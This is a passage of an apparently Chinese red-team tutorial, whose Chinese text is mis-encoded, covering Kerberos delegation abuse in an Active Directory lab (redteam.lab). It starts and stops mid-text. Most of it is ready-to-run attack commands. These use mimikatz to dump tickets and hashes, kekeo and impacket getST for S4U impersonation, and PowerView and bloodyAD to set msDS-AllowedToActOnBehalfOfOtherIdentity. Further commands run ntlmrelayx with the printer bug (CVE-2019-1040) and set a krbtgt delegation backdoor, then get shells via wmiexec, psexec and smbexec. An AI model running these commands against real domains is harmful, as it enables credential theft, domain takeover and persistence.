-TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize<br><span class="hljs-comment"># PowerViewæŸ¥è¯¢çº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·</span><br>powershell Get-DomainUser â€“TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl<br><br></code></pre></td></tr></table></figure><p>çº¦æŸå§”æ´¾å…±è®¡çš„å…³é”®å°±æ˜¯<strong>è·å¾—å¯è½¬å‘çš„æœåŠ¡ç¥¨æ®ST</strong></p><p>åªè¦æ§åˆ¶é…ç½®çº¦æŸå§”æ´¾æœåŠ¡çš„æœºå™¨ï¼Œå¹¶è·å¾—å®ƒçš„å¯†ç ã€‚å°±å¯ä»¥åŠ«æŒè¿™å°ä¸»æœºçš„kerberosè¯·æ±‚ï¼Œæœ€ç»ˆè·å¾—ä»»æ„ç”¨æˆ·æƒé™çš„ticket</p><h4 id="ä½¿ç”¨æœºå™¨è´¦æˆ·çš„ç¥¨æ®"><a href="#ä½¿ç”¨æœºå™¨è´¦æˆ·çš„ç¥¨æ®" class="headerlink" title="ä½¿ç”¨æœºå™¨è´¦æˆ·çš„ç¥¨æ®"></a>ä½¿ç”¨æœºå™¨è´¦æˆ·çš„ç¥¨æ®</h4><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>éœ€è¦Administratoræƒé™</li><li>ç›®æ ‡æœºå™¨è´¦æˆ·é…ç½®äº†çº¦æŸæ€§å§”æ´¾</li></ol><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>ä½¿ç”¨mimikatzå·¥å…·å¯¼å‡ºIsass.exeè¿›ç¨‹ä¸­æ‰€æœ‰çš„ç¥¨æ®ï¼Œå¾—åˆ°æƒ³è¦çš„æœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯¼å‡ºç¥¨æ®</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K48nX9vZtL.png" alt=""></p><p>ä½¿ç”¨kekeoå·¥å…·ç”³è¯·æœåŠ¡ç¥¨æ®ï¼ˆS4U2Proxyï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç”³è¯·æœåŠ¡ç¥¨æ®</span><br>kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN10-1<span class="hljs-variable">$@krbtgt</span>-REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DzgJwnlApq.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯¼å…¥ç¥¨æ®</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-comment"># è®¿é—®</span><br><span class="hljs-built_in">dir</span> \\DC2016.redteam.lab\c$<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ptgvPyz844.png" alt=""></p><h4 id="ä½¿ç”¨æœºå™¨è´¦æˆ·çš„Hashå€¼"><a href="#ä½¿ç”¨æœºå™¨è´¦æˆ·çš„Hashå€¼" class="headerlink" title="ä½¿ç”¨æœºå™¨è´¦æˆ·çš„Hashå€¼"></a>ä½¿ç”¨æœºå™¨è´¦æˆ·çš„Hashå€¼</h4><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>éœ€è¦Administratoræƒé™</li><li>ç›®æ ‡æœºå™¨è´¦æˆ·é…ç½®äº†çº¦æŸæ€§å§”æ´¾</li></ol><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>ä½¿ç”¨mimikatzè·å–NTLM Hashå€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png" alt=""></p><p>ä½¿ç”¨getSTç”³è¯·æœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py -dc-ip 10.10.2.20 -spn CIFS/DC2016.redteam.lab -impersonate administrator redteam.lab/WIN10-1$ -hashes :8f91f8786d308e62c609688886dc7c4c<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ç¥¨æ®è¿œç¨‹è®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">KRB5CCNAME=administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png" alt=""></p><h3 id="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</h3><p>Resource Based Constrained Delegationï¼ˆRBCDï¼‰ä¸éœ€è¦é€šè¿‡å…·å¤‡SeEnableDelegationPrivilegeæƒé™çš„åŸŸç®¡ç†å‘˜è¿›è¡Œä¿®æ”¹ï¼Œ<strong>è€Œæ˜¯å°†è®¾ç½®å±æ€§çš„æƒé™ç»™äº†æœåŠ¡èµ„æºæœ¬èº«</strong>ã€‚</p><p>é…ç½®äº†RBCDçš„è´¦æˆ·å±æ€§æœ‰å¦‚ä¸‹å˜åŒ–ï¼š</p><ul><li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§æŒ‡å‘å§”æ´¾è´¦æˆ·</li></ul><p>å¯ä»¥å°†åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ç†è§£ä¸ºä¼ ç»Ÿçš„çº¦æŸæ€§å§”æ´¾çš„åå‘è¿‡ç¨‹ã€‚</p><p>ä»¥Aã€Bä¸¤ä¸ªæœåŠ¡ä¸ºä¾‹ï¼Œçº¦æŸæ€§å§”æ´¾éœ€è¦åœ¨Aä¸Šè®¾ç½®<code>msDS-AllowedToDelegateTo</code>å±æ€§ï¼Œä»¥æŒ‡å®šå¯¹Bä¸Šçš„å“ªä¸ªæœåŠ¡è¿›è¡Œå§”æ´¾ã€‚è€ŒRBCDéœ€è¦åœ¨Bä¸Šå°†<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§å€¼è®¾ä¸ºAçš„SIDï¼Œå…è®¸Aå¯¹Bä¸Šçš„æœåŠ¡è¿›è¡Œå§”æ´¾</p><p>æ­¤å¤–ï¼Œåœ¨ä¼ ç»Ÿçš„çº¦æŸæ€§å§”æ´¾ä¸­ï¼Œé€šè¿‡S4U2Selfç”³è¯·åˆ°çš„STç¥¨æ®ä¸€å®šæ˜¯å¯è½¬å‘çš„ï¼Œå¦åˆ™S4U2Proxyé˜¶æ®µå°†å¤±è´¥ã€‚ä½†åœ¨RBCDä¸­ï¼Œä¸å¯è½¬å‘çš„STä»ç„¶å¯ä»¥é€šè¿‡S4U2Proxyé˜¶æ®µå¯¹å…¶ä»–æœåŠ¡è¿›è¡Œå§”æ´¾è®¤è¯ã€‚</p><h4 id="åˆ©ç”¨å‰æ"><a href="#åˆ©ç”¨å‰æ" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h4><ol><li>å…·æœ‰å¯¹ä¸»æœºä¿®æ”¹<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„æƒåˆ©</li><li>å¯ä»¥åˆ›å»ºæœºå™¨è´¦æˆ·ï¼ˆæˆ–å·²ç»çŸ¥é“æœºå™¨è´¦æˆ·ï¼‰</li></ol><p><strong>å…·å¤‡ä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§æƒé™çš„ç”¨æˆ·ï¼š</strong></p><ol><li>å°†è¯¥ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·è´¦æˆ·<br>è¯¥è´¦æˆ·ä¸­æœ‰ä¸€ä¸ª<code>msDS-CreatorSID</code>å±æ€§ï¼Œç”¨äºæ ‡è®°åŠ å…¥åŸŸæ—¶ä½¿ç”¨çš„ç”¨æˆ·è´¦æˆ·SID</li><li>Account Operatorç»„æˆå‘˜</li><li>è¯¥ä¸»æœºçš„æœºå™¨è´¦æˆ·</li></ol><p><strong>å…·å¤‡åˆ›å»ºåŠå…¶è´¦æˆ·æƒé™çš„ç”¨æˆ·ï¼š</strong></p><ol><li>ä¸€èˆ¬åŸŸæˆå‘˜ï¼Œç”±<code>msDS-MachineAccountQuota</code>å±æ€§å†³å®šï¼Œé»˜è®¤å¯ä»¥åˆ›å»º10ä¸ªæœºå™¨è´¦æˆ·</li></ol><h4 id="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°å¯ä¿®æ”¹å§”æ´¾æƒé™çš„ç”¨æˆ·"><a href="#ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°å¯ä¿®æ”¹å§”æ´¾æƒé™çš„ç”¨æˆ·" class="headerlink" title="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°å¯ä¿®æ”¹å§”æ´¾æƒé™çš„ç”¨æˆ·"></a>ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°å¯ä¿®æ”¹å§”æ´¾æƒé™çš„ç”¨æˆ·</h4><ol><li>å·²çŸ¥æœºå™¨è´¦æˆ·</li><li>æ‰¾åˆ°ä½¿å…¶åŠ å…¥åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ï¼Œè¿™ä¸ªç”¨æˆ·è´¦æˆ·å°±å…·å¤‡ä¿®æ”¹<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>çš„æƒé™</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨adfind.exeæŸ¥æ‰¾æœºå™¨è´¦æˆ·çš„mS-DS-CreatorSIDå±æ€§</span><br>AdFind.exe -h 10.10.2.20 -u ken -up 123.com -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID<br><br><span class="hljs-comment"># ä½¿ç”¨PowershellåæŸ¥SIDå¯¹åº”çš„ç”¨æˆ·</span><br>powerpick <span class="hljs-variable">$objSID</span> = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-1104;<span class="hljs-variable">$objUser</span> = <span class="hljs-variable">$objSID</span>.Translate([System.Security.Principal.NTAccount]);<span class="hljs-variable">$objUser</span>.Value<br></code></pre></td></tr></table></figure><h4 id="ä¾¦æŸ¥æ€è·¯ï¼šç”±ç”¨æˆ·æŸ¥æ‰¾å…¶åŠ å…¥åŸŸä¸­çš„æœºå™¨"><a href="#ä¾¦æŸ¥æ€è·¯ï¼šç”±ç”¨æˆ·æŸ¥æ‰¾å…¶åŠ å…¥åŸŸä¸­çš„æœºå™¨" class="headerlink" title="ä¾¦æŸ¥æ€è·¯ï¼šç”±ç”¨æˆ·æŸ¥æ‰¾å…¶åŠ å…¥åŸŸä¸­çš„æœºå™¨"></a>ä¾¦æŸ¥æ€è·¯ï¼šç”±ç”¨æˆ·æŸ¥æ‰¾å…¶åŠ å…¥åŸŸä¸­çš„æœºå™¨</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥ç”¨æˆ·è´¦æˆ·SID</span><br><span class="hljs-built_in">whoami</span> /all<br><br><span class="hljs-comment"># ä½¿ç”¨PowerViewæŸ¥ç»ç”±è¯¥ç”¨æˆ·åŠ å…¥åŸŸå†…çš„æœºå™¨è´¦æˆ·(ä¸»æœº)</span><br><span class="hljs-comment"># éœ€è¦å…·å¤‡GeneriCallæˆ–WritePropertyç­‰ä¿®æ”¹æƒé™</span><br>powershell-import PowerView.ps1<br>powerpick Get-DomainObjectAcl | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier -match <span class="hljs-string">&quot;S-1-5-21-3309395417-4108617856-2168433834-1104&quot;</span>&#125; | select objectdn,activedirectoryrights<br></code></pre></td></tr></table></figure><h4 id="é€šè¿‡ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº"><a href="#é€šè¿‡ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº" class="headerlink" title="é€šè¿‡ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº"></a>é€šè¿‡ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº</h4><p><strong>å…³é”®ï¼š</strong> èƒ½ä¿®æ”¹é‚£å°æœåŠ¡èµ„æºçš„å§”æ´¾å±æ€§ï¼Œå°±èƒ½æ‹¿ä¸‹è¯¥å°ä¸»æœº</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>å…è®¸åˆ›å»ºæœºå™¨è´¦æˆ·</li><li>å…·æœ‰ç®¡ç†ä¸»æœºåŠ å…¥åŸŸçš„ç”¨æˆ·è´¦æˆ·</li></ol><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>æ·»åŠ æœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨addcpmputeråˆ›å»ºæœºå™¨è´¦æˆ·</span><br>python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># ä½¿ç”¨bloodyADå·¥å…·åˆ›å»ºæœºå™¨è´¦æˆ·</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT01 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢æœºå™¨è´¦æˆ·çš„SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨ PowerView å·¥å…·æŸ¥è¯¢æœºå™¨è´¦æˆ·SID</span><br>S-1-5-21-3309395417-4108617856-2168433834-1108<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹æœåŠ¡èµ„æºçš„å§”æ´¾å±æ€§ï¼Œå³ msDS-AllowedToActOnBehalfOfOtherIdentity</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯¼å…¥powershell Set-ExecutionPolicy Bypass -Scope Process. .\powerview.ps1</span><br>powershell-import PowerView.ps1<br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1108)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><span class="hljs-comment"># æŸ¥è¯¢å±æ€§</span><br>powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment"># åŸŸæ§æŸ¥è¯¢å‘½ä»¤</span><br>Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount<br><span class="hljs-comment"># æ¸…é™¤å±æ€§</span><br>Set-DomainObject SERVER2012 -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br></code></pre></td></tr></table></figure><p>ç”³è¯·æœåŠ¡ç¥¨æ®å¹¶åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨getST.pyç”³è¯·ç¥¨æ®</span><br>python3 getST.py redteam.lab/CPT01$:Passw0rd -spn cifs/SERVER2012.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><span class="hljs-comment"># å¯¼å…¥ç¥¨æ®</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><span class="hljs-comment"># ç›´æ¥ç™»å½•</span><br>python3 wmiexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="å·²çŸ¥Account-Operatorsç»„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº"><a href="#å·²çŸ¥Account-Operatorsç»„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº" class="headerlink" title="å·²çŸ¥Account Operatorsç»„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº"></a>å·²çŸ¥Account Operatorsç»„ç”¨æˆ·æ‹¿ä¸‹ä¸»æœº</h4><p>å¯ä»¥è·å¾—åŸŸå†…é™¤äº†åŸŸæ§ä¹‹å¤–çš„æ‰€æœ‰æœºå™¨</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>è·å¾—å±äºAccount Operatorsç»„çš„ç”¨æˆ·è´¦æˆ·</li><li>å¯ä»¥åˆ›å»ºæœºå™¨è´¦æˆ·</li></ol><p>Acount Operatorsç»„æˆå‘˜èƒ½ä¿®æ”¹<strong>åŸŸå†…ä»»æ„ä¸»æœº</strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§</p><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>æŸ¥è¯¢Account Operatorsç»„æˆå‘˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adfind.exe -h 10.10.2.20:389 -s subtree -b CN=<span class="hljs-string">&quot;Account Operators&quot;</span>,CN=Builtin,DC=redteam,DC=lab member<br></code></pre></td></tr></table></figure><p>åˆ›å»ºæœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨bloodyAD.pyåˆ›å»ºæœºå™¨è´¦æˆ·</span><br>python3 bloodyAD.py -d redteam.lab -u mark -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT02 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®å§”æ´¾å±æ€§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨PowerViewå·¥å…·æŸ¥è¯¢æœºå™¨è´¦æˆ·SID</span><br>powerpick Get-NetComputer CPT02 -Properties objectsid<br>S-1-5-21-3309395417-4108617856-2168433834-1112<br><br><span class="hljs-comment"># ä¿®æ”¹æœåŠ¡èµ„æºmsDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§</span><br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment"># æŸ¥è¯¢å±æ€§</span><br>powerpick Get-DomainComputer WIN7-1 -Properties msds-allowedtoactonbehalfofotheridentity<br></code></pre></td></tr></table></figure><p>ç”³è¯·æœåŠ¡ç¥¨æ®å¹¶åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åˆ›å»ºæœåŠ¡ç¥¨æ®</span><br>python3 getST.py redteam.lab/CPT02$:Passw0rd -spn cifs/WIN7-1.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># å¯¼å…¥ç¥¨æ®</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><br><span class="hljs-comment"># ç›´æ¥ç™»å½•</span><br>python3 wmiexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="ç»“åˆHTML-Relayæ”»å‡»æ‹¿ä¸‹ä¸»æœºï¼ˆCVE-2019-1040ï¼‰"><a href="#ç»“åˆHTML-Relayæ”»å‡»æ‹¿ä¸‹ä¸»æœºï¼ˆCVE-2019-1040ï¼‰" class="headerlink" title="ç»“åˆHTML Relayæ”»å‡»æ‹¿ä¸‹ä¸»æœºï¼ˆCVE-2019-1040ï¼‰"></a>ç»“åˆHTML Relayæ”»å‡»æ‹¿ä¸‹ä¸»æœºï¼ˆCVE-2019-1040ï¼‰</h4><p>ç»•è¿‡NTLM MICæ ¡éªŒ+æ‰“å°æœºæ¼æ´+NTLM Relay+åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ç»„åˆæ”»å‡»</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>ç›®æ ‡å¼€å¯æ‰“å°æœºæœåŠ¡</li><li>èƒ½åˆ›å»ºæœºå™¨è´¦æˆ·</li></ol><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>åˆ›å»ºæœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT03 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>ç›‘å¬è®¤è¯è¯·æ±‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py -t ldap://10.10.2.20 -smb2support --remove-mic --delegate-access --escalate-user CPT03\$<br></code></pre></td></tr></table></figure><p>æ‰“å°æœºæ¼æ´æ‰§è¡Œå¼ºåˆ¶è®¤è¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 printerbug.py redteam.lab/ken:123.com@10.10.2.50 10.10.2.77<br></code></pre></td></tr></table></figure><p>ç”³è¯·æœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT03\$:Passw0rd -spn CIFS/SERVER2012.redteam.lab -impersonate Administrator -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ³¨å…¥ç¥¨æ®</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br><span class="hljs-comment"># è¿œç¨‹è®¿é—®</span><br>python3 smbexec.py -target-ip 10.10.2.50 -k SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="krbtgtç”¨æˆ·å§”æ´¾"><a href="#krbtgtç”¨æˆ·å§”æ´¾" class="headerlink" title="krbtgtç”¨æˆ·å§”æ´¾"></a>krbtgtç”¨æˆ·å§”æ´¾</h4><p>åœ¨è·å–åˆ°åŸŸæ§æƒé™åï¼Œå¯ä»¥å¯¹krbtgtç”¨æˆ·è®¾ç½®å§”æ´¾å±æ€§ï¼Œä»¥å®ç°ç»´æŒæƒé™çš„ç›®çš„</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>è·å–åŸŸæ§æƒé™</li></ol><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><p>è®¾ç½®å§”æ´¾å±æ€§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åˆ›å»ºæœºå™¨è´¦æˆ·</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT04 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br><span class="hljs-comment"># è®¾ç½®krbtgtå§”æ´¾æƒé™ | æŸ¥è¯¢</span><br>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount CPT04$<br>Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount<br></code></pre></td></tr></table></figure><p>ç”³è¯·&amp;ä½¿ç”¨ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT04\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20<br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br>python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br>KRB5CCNAME=Administrator.ccache | python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><h2 id="PACæ”»å‡»"><a href="#PACæ”»å‡»" class="headerlink" title="PACæ”»å‡»"></a>PACæ”»å‡»</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>MS14-068æ¼æ´çš„åŸå› 